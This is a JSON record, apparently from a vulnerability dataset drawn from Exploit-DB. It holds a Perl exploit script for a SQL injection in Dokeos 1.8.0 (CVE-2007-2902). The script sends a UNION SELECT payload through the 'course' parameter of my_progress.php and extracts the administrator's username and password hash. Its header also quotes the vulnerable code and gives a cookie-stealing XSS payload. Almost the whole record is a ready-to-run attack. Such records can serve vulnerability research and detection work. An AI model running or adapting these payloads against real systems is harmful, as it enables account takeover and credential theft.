{
  "id": "3974",
  "title": "Dokeos 1.8.0 - &#039;my_progress.php?course&#039; SQL Injection",
  "cve": "CVE-2007-2902",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n#################################################################################\r\n#                                        \t\t\t\t\t#\r\n#                    Dokeos <= 1.8.0 SQL Injection Exploit            \t\t#\r\n#                                        \t\t\t\t\t#\r\n# Discovered by: Silentz                            \t\t\t\t#\r\n# Payload: Admin Username & Hash Retrieval                    \t\t\t#\r\n# Website: http://www.w4ck1ng.com                        \t\t\t#\r\n#                                         \t\t\t\t\t#\r\n# Vulnerable Code (my_progress.php):                         \t\t\t# \r\n#                                        \t\t\t\t\t#\r\n#    if(isset($_GET['course'])) {$sqlInfosCourse = \"SELECT course.code,    \t#\r\n#  course.title,course.db_name,CONCAT(user.firstname,' ',user.lastname ,' / ',  #\r\n#  user.email) as tutor_infos FROM $tbl_user as user,$tbl_course as course INNER#\r\n#  JOIN $tbl_session_course as sessionCourse ON sessionCourse.course_code =     #\r\n#  course.code WHERE sessionCourse.id_coach = user.user_id AND course.code=     #\r\n#  '\".$_GET['course'].\"'\";                           \t\t\t\t#\r\n#                                        \t\t\t\t\t#\r\n#                                       \t\t\t\t\t#\r\n# PoC: http://victim.com/dokeos/main/auth/my_progress.php?course=-999'         \t# \r\n#      UNION SELECT 0,password,0,username FROM user where user_id = '1'/*    \t#\r\n#                                        \t\t\t\t\t#\r\n#                                         \t\t\t\t\t#\r\n# Subject To: magic_quotes_gpc set to off & have an already existant         \t# \r\n#             student/teacher account                        \t\t\t#\r\n#                                        \t\t\t\t\t#\r\n# GoogleDork: Get your own!                            \t\t\t\t#\r\n# Shoutz: The entire w4ck1ng community                        \t\t\t# \r\n#                                        \t\t\t\t\t#\r\n# Notes: To obtain SESSION_ID field you can log on and XSS yourself, like so:   #\r\n#                                        \t\t\t\t\t#\r\n#     http://victim.com/dokeos/main/inc/lib/fckeditor/editor/plugins/    \t#\r\n#     ImageManager/editor.php?img=\"><script>alert(document.cookie)</script>    \t#\r\n#                                        \t\t\t\t\t# \r\n#     Also, the amount of XSS vulnerabilites in this application is truely    \t#\r\n#     unbelievable.                                \t\t\t\t#\r\n#                                        \t\t\t\t\t#\r\n################################################################################# \r\n\r\nuse LWP::UserAgent;\r\nif (@ARGV < 2){\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                  Dokeos <= 1.8.0 SQL Injection Exploit\\r\\n\"; \r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"Usage: w4ck1ng_dokeos.pl [PATH] [SESSION_ID]\\r\\n\\r\\n\";\r\nprint \"[PATH] = Path where Dokeos is located\\r\\n\"; \r\nprint \"[SESSION_ID] = Session identifier of logged on user\\r\\n\\r\\n\";\r\nprint \"e.g. w4ck1ng_dokeos.pl http://victim.com/dokeos/ cjjjauie95inbmo5fim8m93vo1\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                     http://www.w4ck1ng.com\\r\\n \";\r\nprint \"                            ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\n$b = LWP::UserAgent->new() or die \"Could not initialize browser\\n\"; \r\n$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');\r\n$cookie = \"$ARGV[1];\";\r\n$host = $ARGV[0] . \"main/auth/my_progress.php?course=-999' UNION SELECT 0,password,0,username FROM user where user_id = '1'/*\"; \r\n\r\nmy @cookie = ('Cookie' => \"dk_sid=$cookie;\");\r\nmy $res = $b->get($host, @cookie);\r\n\r\n$answer = $res->content;\r\nif ($answer =~ / - Coach : (.*?)<\\/strong>/){\r\nprint \"-------------------------------------------------------------------------\\r\\n\"; \r\nprint \"                  Dokeos <= 1.8.0 SQL Injection Exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"[+] Admin User : $1\\n\"; \r\n}\r\n\r\nif ($answer =~/<strong>([0-9a-fA-F]{32}) - Coach :/){\r\nprint \"[+] Admin Hash : $1\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"                      http://www.w4ck1ng.com\\r\\n\";\r\nprint \"                            ...Silentz\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\n}\r\n\r\nelse { \r\n  print \"\\nExploit Failed...\\n\";\r\n}\r\n\r\n# milw0rm.com [2007-05-23]",
  "url": "https://www.exploit-db.com/exploits/3974"
}